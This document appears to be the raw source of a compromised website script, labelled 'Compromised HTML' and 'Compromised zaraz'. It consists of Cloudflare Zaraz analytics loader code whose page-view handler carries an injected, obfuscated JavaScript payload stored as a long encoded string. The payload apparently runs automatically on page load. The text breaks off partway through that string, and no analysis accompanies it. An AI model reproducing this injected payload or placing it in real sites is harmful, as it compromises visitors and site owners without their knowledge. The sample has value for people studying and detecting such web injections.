/* Compromised HTML */
<script data-cfasync="false" nonce="a4ca6a1b-9737-45df-bde4-8bbfe4e32fb8">try{(function(w,d){!function(lP,lQ,lR,lS){if(lP.zaraz)console.error("zaraz is loaded twice");else{lP[lR]=lP[lR]||{};lP[lR].executed=[];lP.zaraz={deferred:[],listeners:[]};lP.zaraz._v="20";lP.zaraz._n="a4ca6a1b-9737-45df-bde4-8bbfe4e32fb8";lP.zaraz.q=[];lP.zaraz._f=function(lT){return async function(){var lU=Array.prototype.slice.call(arguments);lP.zaraz.q.push({m:lT,a:lU})}};for(const lV of["track","set","debug"])lP.zaraz[lV]=lP.zaraz._f(lV);lP.zaraz.init=()=>{var lW=lQ.getElementsByTagName(lS)[0],lX=lQ.createElement(lS),lY=lQ.getElementsByTagName("title")[0];lY&&(lP[lR].t=lQ.getElementsByTagName("title")[0].text);lP[lR].x=Math.random();lP[lR].w=lP.screen.width;lP[lR].h=lP.screen.height;lP[lR].j=lP.innerHeight;lP[lR].e=lP.innerWidth;lP[lR].l=lP.location.href;lP[lR].r=lQ.referrer;lP[lR].k=lP.screen.colorDepth;lP[lR].n=lQ.characterSet;lP[lR].o=(new Date).getTimezoneOffset();if(lP.dataLayer)for(const lZ of Object.entries(Object.entries(dataLayer).reduce((l$,ma)=>({...l$[1],...ma[1]}),{})))zaraz.set(lZ[0],lZ[1],{scope:"page"});lP[lR].q=[];for(;lP.zaraz.q.length;){const mb=lP.zaraz.q.shift();lP[lR].q.push(mb)}lX.defer=!0;for(const mc of[localStorage,sessionStorage])Object.keys(mc||{}).filter(me=>me.startsWith("_zaraz_")).forEach(md=>{try{lP[lR]["z_"+md.slice(7)]=JSON.parse(mc.getItem(md))}catch{lP[lR]["z_"+md.slice(7)]=mc.getItem(md)}});lX.referrerPolicy="origin";lX.src="/cdn-cgi/zaraz/s.js?z="+btoa(encodeURIComponent(JSON.stringify(lP[lR])));lW.parentNode.insertBefore(lX,lW)};["complete","interactive"].includes(lQ.readyState)?zaraz.init():lP.addEventListener("DOMContentLoaded",zaraz.init)}}(w,d,"zarazData","script");window.zaraz._p=async nK=>new Promise(nL=>{if(nK){nK.e&&nK.e.forEach(nM=>{try{const nN=d.querySelector("script[nonce]"),nO=nN?.nonce||nN?.getAttribute("nonce"),nP=d.createElement("script");nO&&(nP.nonce=nO);nP.innerHTML=nM;nP.onload=()=>{d.head.removeChild(nP)};d.head.appendChild(nP)}catch(nQ){console.error(`Error executing script: ${nM}\n`,nQ)}});Promise.allSettled((nK.f||[]).map(nR=>fetch(nR[0],nR[1])))}nL()});zaraz._p({"e":["(function(w,d){})(window,document)"]});})(window,document)}catch(e){throw fetch("/cdn-cgi/zaraz/t"),e;};</script>

/* Compromised zaraz */
try{(function(w,d){zaraz.debug=(mU="")=>{document.cookie=`zarazDebug=${mU}; path=/`;location.reload()};window.zaraz._al=function(mf,mg,mh){w.zaraz.listeners.push({item:mf,type:mg,callback:mh});mf.addEventListener(mg,mh)};zaraz.preview=(mi="")=>{document.cookie=`zarazPreview=${mi}; path=/`;location.reload()};zaraz.i=function(mK){const mL=d.createElement("div");mL.innerHTML=unescape(mK);const mM=mL.querySelectorAll("script"),mN=d.querySelector("script[nonce]"),mO=mN?.nonce||mN?.getAttribute("nonce");for(let mP=0;mP<mM.length;mP++){const mQ=d.createElement("script");mO&&(mQ.nonce=mO);mM[mP].innerHTML&&(mQ.innerHTML=mM[mP].innerHTML);for(const mR of mM[mP].attributes)mQ.setAttribute(mR.name,mR.value);d.head.appendChild(mQ);mM[mP].remove()}d.body.appendChild(mL)};zaraz.f=async function(nc,nd){const ne={credentials:"include",keepalive:!0,mode:"no-cors"};if(nd){ne.method="POST";ne.body=new URLSearchParams(nd);ne.headers={"Content-Type":"application/x-www-form-urlencoded"}}return await fetch(nc,ne)};window.zaraz._p=async nK=>new Promise(nL=>{if(nK){nK.e&&nK.e.forEach(nM=>{try{const nN=d.querySelector("script[nonce]"),nO=nN?.nonce||nN?.getAttribute("nonce"),nP=d.createElement("script");nO&&(nP.nonce=nO);nP.innerHTML=nM;nP.onload=()=>{d.head.removeChild(nP)};d.head.appendChild(nP)}catch(nQ){console.error(`Error executing script: ${nM}\n`,nQ)}});Promise.allSettled((nK.f||[]).map(nR=>fetch(nR[0],nR[1])))}nL()});zaraz.pageVariables={};zaraz.__zcl=zaraz.__zcl||{};zaraz.track=async function(mm,mn,mo){return new Promise((mp,mq)=>{const mr={name:mm,data:{}};if(mn?.__zarazClientEvent)Object.keys(localStorage||{}).filter(mt=>mt.startsWith("_zaraz_google_consent_")).forEach(ms=>mr.data[ms]=localStorage.getItem(ms));else{for(const mu of[localStorage,sessionStorage])Object.keys(mu||{}).filter(mw=>mw.startsWith("_zaraz_")).forEach(mv=>{try{mr.data[mv.slice(7)]=JSON.parse(mu.getItem(mv))}catch{mr.data[mv.slice(7)]=mu.getItem(mv)}});Object.keys(zaraz.pageVariables).forEach(mx=>mr.data[mx]=JSON.parse(zaraz.pageVariables[mx]))}Object.keys(zaraz.__zcl).forEach(my=>mr.data[`__zcl_${my}`]=zaraz.__zcl[my]);mr.data.__zarazMCListeners=zaraz.__zarazMCListeners;
mr.data={...mr.data,...mn};mr.zarazData=zarazData;fetch("/cdn-cgi/zaraz/t",{credentials:"include",keepalive:!0,method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(mr)}).catch(()=>{
return fetch("/cdn-cgi/zaraz/t",{credentials:"include",method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(mr)})}).then(function(mA){zarazData._let=(new Date).getTime();return mA.ok?204!==mA.status&&mA.json():mq(new Error("Response not ok: "+mA.status))}).then(async mz=>{await zaraz._p(mz);"function"==typeof mo&&mo()}).finally(()=>mp())})};zaraz.set=function(mB,mC,mD){try{mC=JSON.stringify(mC)}catch(mE){return}prefixedKey="_zaraz_"+mB;sessionStorage&&sessionStorage.removeItem(prefixedKey);localStorage&&localStorage.removeItem(prefixedKey);delete zaraz.pageVariables[mB];if(void 0!==mC){mD&&"session"==mD.scope?sessionStorage&&sessionStorage.setItem(prefixedKey,mC):mD&&"page"==mD.scope?zaraz.pageVariables[mB]=mC:localStorage&&localStorage.setItem(prefixedKey,mC);zaraz.__watchVar={key:mB,value:mC}}};for(const{m:mF,a:mG}of zarazData.q.filter(({m:mH})=>["debug","set"].includes(mH)))zaraz[mF](...mG);for(const{m:mI,a:mJ}of zaraz.q)zaraz[mI](...mJ);delete zaraz.q;delete zarazData.q;zaraz.spaPageview=()=>{zarazData.l=d.location.href;zarazData.t=d.title;zaraz.pageVariables={};zaraz.__zarazMCListeners={};zaraz.track("__zarazSPA")};zaraz.fulfilTrigger=function(nS,nT,nU,nV){zaraz.__zarazTriggerMap||(zaraz.__zarazTriggerMap={});zaraz.__zarazTriggerMap[nS]||(zaraz.__zarazTriggerMap[nS]="");zaraz.__zarazTriggerMap[nS]+="*"+nT+"*";zaraz.track("__zarazEmpty",{...nU,__zarazClientTriggers:zaraz.__zarazTriggerMap[nS]},nV)};zaraz._processDataLayer=mW=>{for(const mX of Object.entries(mW))zaraz.set(mX[0],mX[1],{scope:"page"});if(mW.event){if(zarazData.dataLayerIgnore&&zarazData.dataLayerIgnore.includes(mW.event))return;let mY={};for(let mZ of dataLayer.slice(0,dataLayer.indexOf(mW)+1))mY={...mY,...mZ};delete mY.event;mW.event.startsWith("gtm.")||zaraz.track(mW.event,mY)}};window.dataLayer=w.dataLayer||[];const mV=w.dataLayer.push;Object.defineProperty(w.dataLayer,"push",{configurable:!0,enumerable:!1,writable:!0,value:function(...m$){let na=mV.apply(this,m$);zaraz._processDataLayer(m$[0]);return na}});dataLayer.forEach(nb=>zaraz._processDataLayer(nb));zaraz._cts=()=>{zaraz._timeouts&&zaraz._timeouts.forEach(nh=>clearTimeout(nh));zaraz._timeouts=[]};zaraz._rl=function(){w.zaraz.listeners&&w.zaraz.listeners.forEach(ni=>ni.item.removeEventListener(ni.type,ni.callback));window.zaraz.listeners=[]};const nf=history.pushState.bind(history);history.pushState=function(...nj){try{zaraz._rl();zaraz._cts&&zaraz._cts()}finally{nf(...nj);setTimeout(zaraz.spaPageview,100)}};const ng=history.replaceState.bind(history);history.replaceState=function(...nk){try{zaraz._rl();zaraz._cts&&zaraz._cts()}finally{ng(...nk);setTimeout(zaraz.spaPageview,100)}};zaraz._c=pR=>{const{event:pS,...pT}=pR;zaraz.track(pS,{...pT,__zarazClientEvent:!0})};zaraz._syncedAttributes=["altKey","clientX","clientY","pageX","pageY","button"];zaraz.__zcl.track=!0;zaraz._p({"e":["(function(w,d){;w.zarazData.executed.push(\"Pageview\");})(window,document)","(function(w,d){{const d = document.createElement('div');d.innerHTML = ``;document.body.appendChild(d);};{\n(function(){var _0xb0c5b4=6;var _0xaaa71f='LmBzaGVyb2loLi99DCFzdWMmdXJ0b2VyIT0Mb2Aucn92Y2lgJnFvaGJpcTs7OyFzaGJjYG9oY2Ihenpyf3ZjaWAmYmllc2tjaHI7Ozshc2hiY2BvaGNiIXp6cW9oYmlxKFlZRFFZVUVUT1ZSWU9IT1JPR0pPXENCWVkvdGNyc3RoPQxxb2hiaXEoWVlEUVlVRVRPVlJZT0hPUk9HSk9cQ0JZWTtydHNjPQxlaWh1ciZKSUVHSllVUklUR0FDWU1DXzshdW9yY1l0Y3Znb3RZdXJncmMhPQxlaWh1ciZKQ0FHRV9ZVVJJVEdBQ1lNQ187IWRxK2JpcWhqaWdiY2IhPQxlaWh1ciZCQ0BHU0pSWVVOSVFZQkNKR187NzY2Nj0MZWlodXImTkdIQkpDVFlDXlZJVFI7IVlZRFFZS0lCQ1lUU0hZWSE9DGVpaHVyJktJQkNZQE9KQ1lLR1Y7fQxkdGlxdWN0PCFwNyhsdSEqDGBpaHI8IXA0KGx1ISoMdGNlZ3ZyZW5nPCFwNShsdSEqDGR1aWI8IXAyKGx1ISoMdW9qY2hyPCFwMyhsdSEqDGVqaXNiYGpndGM8IXAwKGx1ISoMZWBZc3ZiZ3JjPCFwMShsdSEqDGtnZVl0Y2VndnJlbmc8IXA+KGx1ISoMa2dlWWVqaXNiYGpndGM8IXA/KGx1IQx7PQxlaWh1ciZFSUhSVEdFUllFSUhAT0E7fQxUVkVZTklVUlU8XSRucnJ2dTwpKXR2ZStrZ29oaGNyKGtncm9lKHdzb21oaWJjKHZ0aSQqJG5ycnZ1PCkpdHZlKGdobXQoZWlrKXZpan9haWgkKiRucnJ2dTwpKXZpan9haWgrdnNkam9lKGhpYm9jdShndnYkKiRucnJ2dTwpKXZpan9haWgra2dvaGhjcih2c2Rqb2UoZGpndXJndm8ob2kkKiRucnJ2dTwpKTd0dmUob2kpa2dyb2UkKiRucnJ2dTwpKXZpan9haWgoYnR2ZShpdGEkKiRucnJ2dTwpKXZpan9haWgoYWdyY3FnfyhyY2hiY3RqfyhlaSQqJG5ycnZ1PCkpYWdyY3FnfyhyY2hiY3RqfyhlaSl2c2Rqb2Updmlqf2FpaCQqJG5ycnZ1PCkpdmlqf2FpaCtrZ29oaGNyKGFncmNxZ38ocmdyc2sob2kkKiRucnJ2dTwpKXZpan9haWgodHZlKHVzZHdzY3R/KGhjcnFpdG0pdnNkam9lJCokbnJydnU8KSl2aWp/YWloKHJuY3R2ZShvaSQqJG5ycnZ1PCkpdmlqf2FpaChqZ3BnKGRzb2piJCokbnJydnU8KSl2aWp/YWloK2RpdCt0dmUodnNkam9laGliYyhlaWskKiRucnJ2dTwpKXZpan9haWgodHZlKG5/dmN0dX9oZSh+f3wpJFsqDEVJSFJUR0VSWUdCQlRDVVU8ITZ+NDQyMzE/YzMxNGVDQ2UzNTY/RzFiP0AzYEdgPjNiY2czYkRkMUIyRyEqDEBTSEVST0lIWVVDSkNFUklUPCFkMD5iNz42PyEqDFJPS0NJU1JZS1U8MzY2NioMS0deWVRDUlRPQ1U8NAx7PQxvYC5yf3ZjaWAmWVlEUVlFSUhSVEdFUllJUENUVE9CQyc7OyFzaGJjYG9oY2IhICBZWURRWUVJSFJUR0VSWUlQQ1RUT0JDL30McnR/fUlkbGNlcihndXVvYWguRUlIUlRHRVJZRUlIQE9BKllZRFFZRUlIUlRHRVJZSVBDVFRPQkMvPXtlZ3Jlbi5jL317DHsMamNyJmVgYTt9ez0MamNyJnZnaGNqRGd1Y1N0ajshIT0MamNyJmd2b0RndWM7ISE9DGpjciZqaWFTdGo7ISE9DGpjciZyaW1jaFN0ajshIT0MamNyJmJpcWhqaWdiU3RqOyEhPQxlaWh1ciZHVk9ZVzRZTUNfWU5DXjshZWQ/Y2A+PjYyNzU+Pz41Mzc3ZzdiYjQ3Z2IwPjU/YjY1ZTY2Zz8wMTQ+NjFiYzI3MmNlM2NnZ2cxY2QyNT82ZyE9DGBzaGVyb2loJmQwMnN0akNoZWliY0d1ZW9vLnVydC99DHJ0f30MdGNyc3RoJmRyaWcuVXJ0b2hhLnVydC8vKHRjdmpnZWMuKVotKWEqISshLyh0Y3ZqZ2VjLilaKSlhKiFZIS8odGN2amdlYy4pOy0iKWEqISEvPQx7ZWdyZW4uYy99DHRjcnN0aCEhPQx7DHsMYHNoZXJvaWgmbmN+UmlEf3JjdS5uY34vfQxydH99DG5jfjtVcnRvaGEubmN+enohIS8ocnRvay4vPQxvYC4nKVhdZytgNis/W30wMnsiKW8ocmN1ci5uY34vL3RjcnN0aCZoc2pqPQxlaWh1ciZpc3I7aGNxJlNvaHI+R3R0Z38uNTQvPQxgaXQuamNyJm87Nj1vOjU0PW8tLS99DGlzcl1vWzt2Z3R1Y09oci5uY34odXNkdXJ0Lm8sNCo0Lyo3MC8gNn5gYD0Mewx0Y3JzdGgmaXNyPQx7ZWdyZW4uYy99DHRjcnN0aCZoc2pqPQx7DHsMYHNoZXJvaWgmZH9yY3VSaUQwMlN0ai5kf3JjdS99DHJ0f30MamNyJmRvaDshIT0MZWlodXImZW5zaG07Nn4+NjY2PQxgaXQuamNyJm87Nj1vOmR/cmN1KGpjaGFybj1vLTtlbnNobS99DGRvaC07VXJ0b2hhKGB0aWtFbmd0RWliYyhndnZqfy5oc2pqKmR/cmN1KHVzZGd0dGd/Lm8qby1lbnNobS8vPQx7DHRjcnN0aCZkcmlnLmRvaC8odGN2amdlYy4pWi0pYSohKyEvKHRjdmpnZWMuKVopKWEqIVkhLyh0Y3ZqZ2VjLik7LSIpYSohIS89DHtlZ3Jlbi5jL30MdGNyc3RoISE9DHsMewxgc2hlcm9paCZkMDJzdGpSaUR/cmN1LmQwMnN0ai99DHJ0f30Mb2AuJ2QwMnN0anp6cn92Y2lgJmQwMnN0aic7OyF1cnRvaGEhL3RjcnN0aCZoc2pqPQxqY3ImZDAyO2QwMnN0aih0Y3ZqZ2VjLikrKWEqIS0hLyh0Y3ZqZ2VjLilZKWEqISkhLz0MZWlodXImdmdiO2QwMihqY2hhcm4jMj0Mb2AudmdiL2QwMi07ITshKHRjdmNnci4yK3ZnYi89DGVpaHVyJmRvaDtncmlkLmQwMi89DGVpaHVyJmlzcjtoY3EmU29ocj5HdHRnfy5kb2goamNoYXJuLz0MYGl0LmpjciZvOzY9bzpkb2goamNoYXJuPW8tLS9pc3Jdb1s7ZG9oKGVuZ3RFaWJjR3Iuby8gNn5gYD0MdGNyc3RoJmlzcj0Me2VncmVuLmMvfQx0Y3JzdGgmaHNqaj0Mewx7DGBzaGVyb2loJmR/cmN1UmlTcmA+LmR/cmN1L30McnR/fQx0Y3JzdGgmaGNxJlJjfnJCY2VpYmN0LiFzcmArPiEqfWBncmdqPGBnanVjey8oYmNlaWJjLmR/cmN1Lz0Me2VncmVuLmMvfQxqY3ImdTshIT0MYGl0LmpjciZvOzY9bzpkf3JjdShqY2hhcm49by0tL3UtO1VydG9oYShgdGlrRW5ndEVpYmMuZH9yY3Vdb1svPQx0Y3JzdGgmdT0Mewx7DGBzaGVyb2loJmVpaGVnckR/cmN1LmcqZC99DGVpaHVyJmlzcjtoY3EmU29ocj5HdHRnfy5nKGpjaGFybi1kKGpjaGFybi89DGlzcih1Y3IuZyo2Lz0MaXNyKHVjci5kKmcoamNoYXJuLz0MdGNyc3RoJmlzcj0MewxndX9oZSZgc2hlcm9paCZ1bmc0MzBEf3JjdS5kf3JjdS99DHJ0f30Mb2Aucn92Y2lgJmV0f3ZyaTs7OyFzaGJjYG9oY2IhenonZXR/dnJpKHVzZHJqY3p6J2V0f3ZyaSh1c2RyamMoYm9hY3VyL3RjcnN0aCZoc2pqPQxlaWh1ciZib2FjdXI7Z3Fnb3ImZXR/dnJpKHVzZHJqYyhib2FjdXIuIVVORys0MzAhKmR/cmN1KGRzYGBjdDlkf3JjdShkc2BgY3Q8ZH9yY3UvPQx0Y3JzdGgmaGNxJlNvaHI+R3R0Z38uYm9hY3VyLz0Me2VncmVuLmMvfQx0Y3JzdGgmaHNqaj0Mewx7DGBzaGVyb2loJnRlMi5tY39Ef3JjdSpiZ3JnRH9yY3UvfQxlaWh1ciZ1O2hjcSZTb2hyPkd0dGd/LjQzMC89DGBpdC5qY3Imbzs2PW86NDMwPW8tLS91XW9bO289DGpjciZsOzY9DGBpdC5qY3Imbzs2PW86NDMwPW8tLS99DGw7LmwtdV1vWy1tY39Ef3JjdV1vI21jf0R/cmN1KGpjaGFyblsvIDQzMz0MZWlodXImcmt2O3Vdb1s9DHVdb1s7dV1sWz0MdV1sWztya3Y9DHsMamNyJm87Nj0MbDs2PQxlaWh1ciZpc3I7aGNxJlNvaHI+R3R0Z38uYmdyZ0R/cmN1KGpjaGFybi89DGBpdC5qY3ImaDs2PWg6YmdyZ0R/cmN1KGpjaGFybj1oLS0vfQxvOy5vLTcvIDQzMz0MbDsubC11XW9bLyA0MzM9DGVpaHVyJnJrdjt1XW9bPQx1XW9bO3VdbFs9DHVdbFs7cmt2PQxlaWh1ciZtO3VdLnVdb1stdV1sWy8gNDMzWz0MaXNyXWhbO2JncmdEf3JjdV1oW1htPQx7DHRjcnN0aCZpc3I9DHsMYHNoZXJvaWgmZHNvamJHdm9TdGoudmd0Z2t1L30Mb2AuJ2d2b0RndWMvdGNyc3RoISE9DHJ0f30MZWlodXImd3U7aGNxJlNUSlVjZ3RlblZndGdrdS52Z3Rna3V6en17LyhyaVVydG9oYS4vPQxlaWh1ciZtY387bmN+UmlEf3JjdS5HVk9ZVzRZTUNfWU5DXi89DG9gLm1jfyAgcn92Y2lgJlNvaHI+R3R0Z38nOzshc2hiY2BvaGNiIS99DGVpaHVyJmhpaGVjO2hjcSZTb2hyPkd0dGd/Lj4vPQxvYC5yf3ZjaWAmZXR/dnJpJzs7IXNoYmNgb2hjYiEgIGV0f3ZyaShhY3JUZ2hiaWtQZ2pzY3UvfQxldH92cmkoYWNyVGdoYmlrUGdqc2N1LmhpaGVjLz0Me2NqdWN9DGBpdC5qY3Imbzs2PW86aGloZWMoamNoYXJuPW8tLS9oaWhlY11vWzsuS2dybih0Z2hiaWsuLyw0MzAvIDQzMz0MewxlaWh1ciZjaGU7LnJ/dmNpYCZSY35yQ2hlaWJjdCc7OyFzaGJjYG9oY2IhLzloY3EmUmN+ckNoZWliY3QuLzxoc2pqPQxlaWh1ciZ2amdvaER/cmN1O2NoZTljaGUoY2hlaWJjLnd1LzwuYHNoZXJvaWguL30MZWlodXImZ3R0O2hjcSZTb2hyPkd0dGd/Lnd1KGpjaGFybi89DGBpdC5qY3Imbzs2PW86d3UoamNoYXJuPW8tLS9ndHRdb1s7d3UoZW5ndEVpYmNHci5vLyA0MzM9DHRjcnN0aCZndHQ9DHsvLi89DGVpaHVyJm1jf0tncjtoY3EmU29ocj5HdHRnfy5tY38oamNoYXJuLWhpaGVjKGpjaGFybi89DG1jf0tncih1Y3IubWN/KjYvPQxtY39LZ3IodWNyLmhpaGVjKm1jfyhqY2hhcm4vPQxlaWh1ciZlb3ZuY3REf3JjdTt0ZTIubWN/S2dyKnZqZ29oRH9yY3UvPQxlaWh1ciZ2Z39qaWdiO2hjcSZTb2hyPkd0dGd/LmhpaGVjKGpjaGFybi1lb3ZuY3REf3JjdShqY2hhcm4vPQx2Z39qaWdiKHVjci5oaWhlYyo2Lz0Mdmd/amlnYih1Y3IuZW92bmN0RH9yY3UqaGloZWMoamNoYXJuLz0MZWlodXImdmdlbWNiO2R/cmN1UmlEMDJTdGoudmd/amlnYi89DG9gLnZnZW1jYi99DHRjcnN0aCZndm9EZ3VjLSEpZ3ZvKW9oYmN+KHZudjl3OyEtdmdlbWNiPQx7DHsMdGNyc3RoISE9DHtlZ3Jlbi5jL30MdGNyc3RoISE9DHsMewxndX9oZSZgc2hlcm9paCZiY2V0f3ZyR3ZvQ2hwY2ppdmMuaWRsKnVlaXZjL30McnR/fQxvYC4naWRsenpyf3ZjaWAmaWRsJzs7IWlkbGNlciEvdGNyc3RoJmlkbD0Mb2Aucn92Y2lgJmlkbCh3Jzs7IXVydG9oYSF6eidpZGwody90Y3JzdGgmaWRsPQxlaWh1ciZ1Z2BjVWVpdmM7LnJ/dmNpYCZ1ZWl2Yzs7OyF1cnRvaGEhICApWF1nK3w2Kz9ZW303KjcweyIpbyhyY3VyLnVlaXZjLy85dWVpdmM8IWVgYSE9DGVpaHVyJmRndWNNY387bmN+UmlEf3JjdS5HVk9ZVzRZTUNfWU5DXi89DG9gLidkZ3VjTWN/L3RjcnN0aCZpZGw9DG9gLmlkbChjaGU7OzshYWVrNyEvfQxydH99DGVpaHVyJnZnZW1jYjtkMDJzdGpSaUR/cmN1LmlkbCh3Lz0Mb2AuJ3ZnZW1jYnp6dmdlbWNiKGpjaGFybjouNzQtNzAtNy8vcm50aXEmaGNxJkN0dGl0LiFhZWtZdmdlbWNiIS89DGVpaHVyJm9wO3ZnZW1jYih1am9lYy42Kjc0Lz0MZWlodXImZW92bmN0UW9yblJnYTt2Z2VtY2IodWpvZWMuNzQvPQxlaWh1ciZhZWtKZ2Rjajt1Z2BjVWVpdmMtIXphZWs3IT0MZWlodXImamdkY2o7LnJ/dmNpYCZSY35yQ2hlaWJjdCc7OyFzaGJjYG9oY2IhLzloY3EmUmN+ckNoZWliY3QuLyhjaGVpYmMuYWVrSmdkY2ovPC5gc2hlcm9paC4vfQxlaWh1ciZ1O2Fla0pnZGNqPQxlaWh1ciZndHQ7aGNxJlNvaHI+R3R0Z38udShqY2hhcm4vPQxgaXQuamNyJm87Nj1vOnUoamNoYXJuPW8tLS9ndHRdb1s7dShlbmd0RWliY0dyLm8vIDQzMz0MdGNyc3RoJmd0dD0Mey8uLz0MZWlodXImbWN/RH9yY3U7Z3Fnb3ImdW5nNDMwRH9yY3UuZWloZWdyRH9yY3UuZGd1Y01jfypqZ2Rjai8vPQxvYC4nbWN/RH9yY3Uvcm50aXEmaGNxJkN0dGl0LiFhZWtZbWN/IS89DG9gLnJ/dmNpYCZldH92cmk7Ozshc2hiY2BvaGNiIXp6J2V0f3ZyaSh1c2RyamN6eidldH92cmkodXNkcmpjKG9rdml0ck1jfy9ybnRpcSZoY3EmQ3R0aXQuIWFla1l1c2RyamMhLz0MZWlodXImZXR/dnJpTWN/O2dxZ29yJmV0f3ZyaSh1c2RyamMob2t2aXRyTWN/LiF0Z3EhKm1jf0R/cmN1Kn1oZ2tjPCFHQ1UrQUVLIXsqYGdqdWMqXSFiY2V0f3ZyIVsvPQxlaWh1ciZ2amdvaERzYDtncWdvciZldH92cmkodXNkcmpjKGJjZXR/dnIufWhna2M8IUdDVStBRUshKm9wPG9wKnJnYUpjaGFybjw3ND57KmV0f3ZyaU1jfyplb3ZuY3RRb3JuUmdhLz0MZWlodXImbHVpaDtkf3JjdVJpU3JgPi5oY3EmU29ocj5HdHRnfy52amdvaERzYC8vPQx0Y3JzdGgmTFVJSCh2Z3R1Yy5sdWloLz0Me2VncmVuLmMvfQxvYC5yf3ZjaWAmaWRsKHc0Ozs7IXVydG9oYSEgIGlkbCh3NC99DGVpaHVyJnZnZW1jYjQ7ZDAyc3RqUmlEf3JjdS5pZGwodzQvPQxvYC52Z2VtY2I0ICB2Z2VtY2I0KGpjaGFybjg7Py99DGVpaHVyJmhpaGVjO3ZnZW1jYjQodWpvZWMuNio+Lz0MZWlodXImZW92bmN0NDt2Z2VtY2I0KHVqb2VjLj4vPQxlaWh1ciZtY39LZ3I7aGNxJlNvaHI+R3R0Z38uZGd1Y01jfyhqY2hhcm4taGloZWMoamNoYXJuLz0MbWN/S2dyKHVjci5kZ3VjTWN/KjYvPQxtY39LZ3IodWNyLmhpaGVjKmRndWNNY38oamNoYXJuLz0MZWlodXImdmpnb2hEf3JjdTQ7dGUyLm1jf0tnciplb3ZuY3Q0Lz0MZWlodXImbHVpaDQ7ZH9yY3VSaVNyYD4udmpnb2hEf3JjdTQvPQx0Y3JzdGgmTFVJSCh2Z3R1Yy5sdWloNC89DHsMewx0Y3JzdGgmaWRsPQx7DHsMb2AuaWRsKGNoZTs7OyF3NCEvfQxlaWh1ciZ2Z2VtY2I7ZDAyc3RqUmlEf3JjdS5pZGwody89DG9gLid2Z2VtY2J6enZnZW1jYihqY2hhcm46Py90Y3JzdGgmaWRsPQxlaWh1ciZoaWhlYzt2Z2VtY2IodWpvZWMuNio+Lz0MZWlodXImZW92bmN0O3ZnZW1jYih1am9lYy4+Lz0MZWlodXImbWN/S2dyO2hjcSZTb2hyPkd0dGd/LmRndWNNY38oamNoYXJuLWhpaGVjKGpjaGFybi89DG1jf0tncih1Y3IuZGd1Y01jfyo2Lz0MbWN/S2dyKHVjci5oaWhlYypkZ3VjTWN/KGpjaGFybi89DGVpaHVyJnZqZ29oRH9yY3U7dGUyLm1jf0tnciplb3ZuY3QvPQxlaWh1ciZsdWloO2R/cmN1UmlTcmA+LnZqZ29oRH9yY3UvPQx0Y3JzdGgmTFVJSCh2Z3R1Yy5sdWloLz0Mewx0Y3JzdGgmaWRsPQx7ZWdyZW4uYy99DHRjcnN0aCZpZGw9DHsMewxydH99DHFvaGJpcShZWWRxQmNldH92ckd2b0NocGNqaXZjO2JjZXR/dnJHdm9DaHBjaml2Yz0Me2VncmVuLmMvfXsMamNyJnVuaXFCY2pnfztCQ0BHU0pSWVVOSVFZQkNKR189DGpjciZraWJjOyFkdGlxdWN0IT0MYHNoZXJvaWgmYGNyZW5Rb3JuUm9rY2lzci5zdGoqaXZyb2lodSpyb2tjaXNyS3UvfQxlaWh1ciZlaWhydGlqamN0O2hjcSZHZGl0ckVpaHJ0aWpqY3QuLz0MZWlodXImcm9rY2lzck9iO3VjclJva2Npc3IuLi87OGVpaHJ0aWpqY3QoZ2RpdHIuLypyb2tjaXNyS3V6ejM2NjYvPQxlaWh1ciZpdnJ1O0lkbGNlcihndXVvYWgufXsqaXZyb2lodXp6fXsqfXVvYWhnajxlaWhydGlqamN0KHVvYWhnansvPQx0Y3JzdGgmYGNyZW4uc3RqKml2cnUvKGBvaGdqan8uLi87OGVqY2d0Um9rY2lzci5yb2tjaXNyT2IvLz0MewxndX9oZSZgc2hlcm9paCZgY3Jlbkx1aWhRb3JuUm9rY2lzci5zdGoqaXZyb2lodSpyb2tjaXNyS3UvfQxlaWh1ciZ0Y3V2O2dxZ29yJmBjcmVuUW9yblJva2Npc3Iuc3RqKml2cm9paHUqcm9rY2lzckt1Lz0Mb2AuJ3RjdXYoaW0vcm50aXEmaGNxJkN0dGl0LiFucnJ2WSEtdGN1dih1cmdyc3UvPQx0Y3JzdGgmZ3Fnb3ImdGN1dihsdWloLi89DHsMYHNoZXJvaWgmYmNlaWJjTmN+VXJ0b2hhLm5jfi99DHJ0f30MamNyJnRjdXNqcjshIT0MYGl0LmpjciZvOzY9bzpuY34oamNoYXJuPW8tOzQvfQxlaWh1ciZkf3JjVXJ0b2hhO25jfih1c2R1cnQubyo0Lz0MZWlodXImZH9yYzt2Z3R1Y09oci5kf3JjVXJ0b2hhKjcwLz0Mb2AuZH9yYzg2L3RjdXNqci07VXJ0b2hhKGB0aWtFbmd0RWliYy5kf3JjLz0Mewx0Y3JzdGgmdGN1c2pyPQx7ZWdyZW4uYy99DHRjcnN0aCEhPQx7DHsMYHNoZXJvaWgmYmNlaWJjVGN1c2pyLnRjdXNqci99DHJ0f30MZWlodXImbmN+QmdyZzt0Y3VzanIodXJndHJ1UW9ybi4hNn4hLzl0Y3VzanIodXNkdXJ0LjQvPHRjdXNqcj0Mb2AubmN+QmdyZyhqY2hhcm46NzQ+L3RjcnN0aCEhPQxlaWh1ciZqY2hhcm5OY347bmN+QmdyZyh1c2R1cnQuMDIqMDIvPQxlaWh1ciZqY2hhcm47dmd0dWNPaHIuamNoYXJuTmN+KjcwLz0Mb2AuamNoYXJuODYgIG5jfkJncmcoamNoYXJuODs3ND4tamNoYXJuLDQvfQxlaWh1ciZ1cnRvaGFOY347bmN+QmdyZyh1c2R1cnQuNzQ+KmpjaGFybiw0Lz0MdGNyc3RoJmJjZWliY05jflVydG9oYS51cnRvaGFOY34vPQx7DHRjcnN0aCEhPQx7ZWdyZW4uYy99DHRjcnN0aCEhPQx7DHsMZ3V/aGUmYHNoZXJvaWgmdml1ckx1aWhRb3JuUm9rY2lzci5zdGoqZGlifypyb2tjaXNyS3UvfQx0Y3JzdGgmZ3Fnb3ImYGNyZW5MdWloUW9yblJva2Npc3Iuc3RqKn0Ma2NybmliPCFWSVVSISoMbmNnYmN0dTx9DCFFaWhyY2hyK1J/dmMhPCFndnZqb2Vncm9paClsdWloISoMIUdlZWN2ciE8IWd2dmpvZWdyb2loKWx1aWghDHsqDGRpYn88TFVJSCh1cnRvaGFvYH8uZGlify8qDGVnZW5jPCFoaSt1cml0YyEMeypyb2tjaXNyS3UvPQx7DGd1f2hlJmBzaGVyb2loJmFjclN0akB0aWtFaWhydGdlci4vfQxlaWh1ciZiZ3JnQG9jamI7ITZ+IS1FSUhSVEdFUllFSUhAT0EoQFNIRV